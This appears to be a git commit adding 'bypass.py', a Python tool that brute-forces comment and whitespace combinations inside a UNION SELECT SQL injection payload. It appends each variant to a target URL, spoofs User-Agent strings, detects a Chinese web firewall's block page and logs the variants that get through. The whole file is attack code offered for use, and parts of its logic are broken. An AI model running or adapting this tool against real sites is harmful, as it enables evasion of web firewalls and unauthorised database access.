a60bc4dd5b88bb464035598313461037cc6b2190
H0r2yc <51698363+H0r2yc@users.noreply.github.com>
2019-07-01 17:21:27 +0800

    Add files via upload

---
+++ bypass.py
@@ -0,0 +1,129 @@
+#!/usr/bin/python
+'''
+Sql pass tamper - To test sql
+Version 1.0 Beta
+
+The program written by Python3.
+'''
+import sys
+import requests
+import getopt
+import random
+import threading
+import time
+
+stop_now = False
+class running:
+    def __init__(self,url,proxies,db):
+        self.num =  1
+        self.url = url
+        self.proxies = proxies
+        self.db = db
+        self.headers = [
+            'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
+            'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
+            'Googlebot/2.1 (http://www.googlebot.com/bot.html)',
+            'Opera/9.20 (Windows NT 6.0; U; en)',
+            'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
+            'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
+            'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
+            'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
+            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
+            'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
+            'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
+            'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)',
+            'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
+            'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
+            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
+            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
+            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+            'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
+            'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)'
+        ]
+        self.FUZZ_qwe = ['/*', '*/', '/*!', '/**/', '?', '/', '*', '=', '`', '!', '%', '.', '-', '+']
+        self.FUZZ_ewq = [' ']
+        self.FUZZ_sqllite = ['0A', '0D', '0C', '09', '20']
+        self.FUZZ_mysql = ['09', '0A', '0B', '0C', '0D', 'A0', '20']
+        self.FUZZ_oracle = ['00', '09', '0A', '0B', '0C', '0D', '20']
+        self.FUZZ_mssql = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '0A', '0B', '0C', '0D', '0E', '0F', '10',
+                      '11', '12', '13', '14', '15', '16', '17', '18', '19', '1A', '1B', '1C', '1D', '1E', '1F', '20',
+                      '25']
+    def data(self):
+        lock = threading.RLock()
+        targetdb = 'self.FUZZ_'+self.db
+        FUZZ = self.FUZZ_qwe+self.FUZZ_ewq+eval(targetdb)
+        tested = []
+        for a in FUZZ:
+            for b in FUZZ:
+                for c in FUZZ:
+                    for d in FUZZ:
+                        for e in FUZZ:
+                            lock.acquire()
+                            self.num += 1
+                            fix = a+b+c+d+e
+                            if fix in tested:
+                                pass
+                            else:
+                                tested.append(fix)
+                                payload = '/*!union'+fix+'select*/(@@version)'
+                                url_test = self.url+payload
+                                header = {'User-Agent': random.choice(self.headers)}
+                                res = requests.get(url=url_test,headers=header)
+                                status = res.status_code
+                                with open('results.txt','a+') as file:
+                                    if '网站防火墙' in res.text:
+                                        print(url_test+'\033[0;31;40m is bad\033[0m')
+                                    elif status == '200' and 'MariaDB' in res.text:
+                                        print('[STATUS]'+url_test+'\033[0;32;40mIS OK!!!\033[0m')
+                                        file.write(url_test)
+                                    else:
+                                        print(url_test+' \033[0;33;40mnot a value select\033[0m')
+                            sys.stdout.write('\r进度：%s/%s' %(self.num,len(FUZZ)**5))
+                            sys.stdout.flush()
+                            lock.release()
+
+def usage():
+    print('./fixfuzz.py -u <url> -d <dbname> [-r <threads> -p -h]')
+    print(' -u |--url <URL>')
+    print(' -d |--dbms database kind<sqllite,mysql,oracle,mssql>')
+    print(' -d |--dbms database kind<sqllite,mysql,oracle,mssql>')
+    print(' -r |--threads <Number of threads> Defaults to 16(max)')
+    print(' -p |--proxy proxy(开发中)')
+    print(' -h |--help Shows this help\n')
+    print('Eg. ./fixfuzz.py -u http://127.0.0.1/news/list.php?id=11 -d mysql -r 256 -p http://127.0.0.1:1080\n')
+def main(argv):
+    proxies = False
+    threads = 16
+    try:
+        opts, args = getopt.getopt(argv, 'hp:r:d:u:', ['help', 'proxy=', 'url=', 'threads=', 'dbms='])
+    except getopt.GetoptError:
+        usage()
+        sys.exit(-1)
+    for i,u in opts:
+        if i in ('-h','--help'):
+            usage()
+            exit(-1)
+        if i in ('-u','--url'):
+            url = u
+        if i in ('-d','--dbms'):
+            db = u
+        if i in ('-r','--threads'):
+            threads = u
+        if i in ('-p','--proxy'):
+            proxies = u
+    if url == '' or db == '' or int(threads) > 16:
+        usage()
+        sys.exit(-1)
+    threadsl = running(url,proxies,db)
+    threadlist = []
+    for i in range(int(threads)):
+        t = threadsl.data()
+        threadlist.append(t)
+        t.start()
+    while len(threadlist) > 0:
+        try:
+            threadlist = [i.join(1) for i in threadlist if i is not None and i.isAlive()]
+        except KeyboardInterrupt:
+            print('\nShutting down threads...\n')
+if __name__ == '__main__':
+    main(sys.argv[1:])
